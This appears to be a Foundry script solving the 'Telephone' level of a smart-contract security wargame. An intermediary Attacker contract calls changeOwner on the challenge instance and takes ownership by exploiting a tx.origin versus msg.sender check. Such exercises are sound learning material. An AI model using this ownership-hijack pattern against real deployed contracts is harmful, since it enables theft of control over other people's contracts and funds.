// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { HelperConfig } from "./HelperConfig.s.sol";
import { Telephone } from "../src/04_Telephone.sol";

contract Attacker {
  constructor (address challengeInstanceAddress) {
    Telephone challenge = Telephone(challengeInstanceAddress);
    challenge.changeOwner(msg.sender);
    
    console.log("Owner: %s", challenge.owner());
  }
}

contract TelephoneAttacker is Script {

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {
    
    HelperConfig helperConfig = new HelperConfig();
    address challengeInstanceAddress = helperConfig.instances("Telephone");
    
    vm.startBroadcast(deployerPrivateKey);
    new Attacker(challengeInstanceAddress);
    vm.stopBroadcast();
  }

}